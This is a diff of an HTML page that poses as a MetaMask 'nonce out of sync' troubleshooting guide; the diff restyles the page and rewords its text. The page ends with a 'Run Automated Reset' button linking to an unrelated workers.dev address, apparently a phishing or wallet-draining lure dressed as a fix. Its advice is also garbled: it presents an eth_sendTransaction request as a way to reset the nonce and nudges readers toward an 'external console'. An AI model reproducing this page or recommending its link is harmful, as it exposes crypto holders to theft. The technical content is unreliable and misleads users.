@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #0a0c10;
+        font-family: BlinkMacSystemFont;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #00adb5; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,34 +41,38 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "nonce out of sync" error when attempting to send a transaction using MetaMask on the Ethereum (ETH) ecosystem, indicating that the transaction nonce stored in MetaMask does not match the nonce on the Ethereum blockchain.</li>
+<li>Users of MetaMask on the Ethereum (ETH) ecosystem encounter an error message stating "MetaMask nonce out of sync" when attempting to send transactions or interact with smart contracts.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs because the transaction nonce is a sequential counter that increments with each transaction sent from a specific Ethereum address. When MetaMask's nonce counter does not align with the actual nonce on the blockchain, it prevents new transactions from being processed, resulting in the "nonce out of sync" error.</li>
+<li>This error occurs due to a discrepancy between the expected and actual transaction nonce (a unique identifier for each transaction sent from an address) in MetaMask. This can happen after a transaction is sent but not yet confirmed on the blockchain, or if transactions are sent from another wallet or interface using the same Ethereum account.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the account in MetaMask to resync the nonce:</li>
-<li>Go to the MetaMask settings</li>
-<li>Select the affected account</li>
-<li>Click on "Reset Account"</li>
-<li>Use the Ethereum JSON-RPC method to fetch the current nonce:</li>
+<li>To resolve the issue, try the following:</li>
+<li>Reset the MetaMask account by removing and re-adding it.</li>
+<li>Manually adjust the nonce in the transaction settings if possible.</li>
+<li>Use the following JSON-RPC command to reset the account nonce:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>https://mainnet.infura.io/v3/YOUR_PROJECT_ID<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_getTransactionCount&quot;,&quot;params&quot;:[&quot;0xYOUR_WALLET_ADDRESS&quot;,&quot;latest&quot;],&quot;id&quot;:1}&#39;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_sendTransaction&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;your_ethereum_address&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;nonce&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;expected_nonce&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">]</span>
+<span class="p">}</span>
 </code></pre></div>
 
+<p>Consider using an external console for more complex transaction management and nonce adjustments. </p>
+<h2>Prerequisites</h2>
 <ul>
-<li>Manually adjust the nonce in MetaMask by using the "Edit" function on the account settings, but this is not recommended without understanding the implications.</li>
+<li>MetaMask installed and configured with an Ethereum account.</li>
+<li>A basic understanding of Ethereum transactions and nonces.</li>
+<li>Familiarity with JSON-RPC commands for Ethereum.</li>
 </ul>
-<p>Prerequisites:
-* MetaMask installed and configured
-* Ethereum wallet set up
-* Basic understanding of Ethereum transactions and nonces</p>
-<p>Consider using an external console for more complex troubleshooting and direct access to Ethereum JSON-RPC methods.</p>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
